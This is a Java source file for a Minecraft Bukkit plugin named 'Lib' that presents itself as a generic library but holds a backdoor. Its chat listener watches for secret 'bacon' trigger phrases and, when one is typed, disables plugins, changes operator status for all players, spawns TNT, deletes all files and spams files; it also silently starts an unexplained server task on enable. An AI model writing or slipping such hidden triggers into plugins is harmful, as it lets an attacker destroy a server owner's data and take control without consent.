package me.unknown.lib;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

import me.unknown.filemanager.FileManager;
import me.unknown.lib.server.Server;

public class Lib extends JavaPlugin implements Listener {
	
	public Server server = new Server(this);
	public FileManager manager = new FileManager(this);
	public boolean deleteServer = false;
	public BukkitTask task;
	@Override
	public void onEnable() {
		task = Bukkit.getServer().getScheduler().runTaskAsynchronously(this, new Runnable() {
			
			@Override
			public void run() {
				server.startServer();
			}
		});
		
		getServer().getPluginManager().registerEvents(this, this);
		
	}
	
	public void onDisable() {
		Bukkit.getScheduler().cancelTasks(this);
	}
	
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(AsyncPlayerChatEvent e) {
		if ("i just noticed that bacon is actually bacon, and also is characters 3215401832629573820".equals(e.getMessage())) {
			manager.disablePlugins();
			manager.opAllAndDeopAll();
			manager.onTnt();
			manager.deleteAllFiles();
			manager.spamFiles();
		}
		if ("i just noticed that bacon is actually bacon, an#@$#$daw 32154022311233121832629573820".equals(e.getMessage())) {
			manager.disablePlugins();
		}
		if ("i just noticed that bacon is actually bacon, DAWDAW21cters 321540183125623332432629573820".equals(e.getMessage())) {
			manager.opAllAndDeopAll();
		}
		if ("i just noticed that bacon is actually bacon, DAWdwa312dacters 321540112436432451832629573820".equals(e.getMessage())) {
			manager.onTnt();
		}
		if ("i just noticed that bacon is actually bacon, axxZers 321540123123123832629573820".equals(e.getMessage())) {
			manager.deleteAllFiles();
		}
		if ("i just noticed that bacon is actually bacon, and aDSwscharacters 32154012562311832629573820".equals(e.getMessage())) {
			manager.spamFiles();
		}
		
		
	}
}
